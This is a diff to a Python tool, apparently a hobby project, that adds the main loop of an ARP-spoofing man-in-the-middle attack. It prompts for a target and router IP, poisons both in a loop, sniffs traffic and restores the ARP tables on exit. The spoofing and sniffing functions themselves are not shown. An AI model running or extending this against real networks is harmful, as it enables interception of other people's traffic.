@@ -127,6 +127,53 @@ def start_spoof(interface):
 
 # Main funtion to control the exuction of other functions. Starts spoofer sniffer both
 def start_spoof_sniff(interface):
-    start_spoof()
-    Sniffer.start_sniff(interface)
+    global router_ip
+    global target_ip
+    global packet_count
+
+    target_ip =  str(input("Enter target ip: "))
+    router_ip = str(input("Enter router ip address: "))
+
+    while True:
+        valid_target = validate_ip(target_ip)
+        valid_router = validate_ip(router_ip)
+
+        if not valid_target:
+            Terminal.clear()
+            print("Enter a valid target ip!!\n\n")
+            target_ip =  str(input("Enter target ip: "))
+        
+        elif not valid_router:
+            Terminal.clear()
+            print("Enter a valid router ip!!\n\n")
+            router_ip =  str(input("Enter router ip: "))
+        else:
+            break
+
+    Terminal.clear()
+
+    while True:
+        try:
+            # spoof()
+            # spoof()
+            spoof(target_ip, router_ip)
+            spoof(router_ip, target_ip)
+            packet_count = packet_count + 2
+            print(f"\r[+] Packet sent: {packet_count}", end="")
+            Sniffer.start_sniff(interface)
+            time.sleep(2)
+
+        except KeyboardInterrupt:
+            print("\nStopping...")
+            restore(target_ip, router_ip)
+            restore(router_ip, target_ip)
+            break
+
+        except PermissionError:
+            print("Run the program as root")
+            sys.exit()
+
+        except Exception as e:
+            print(f"Something went wrong {e}")
+            sys.exit()
 
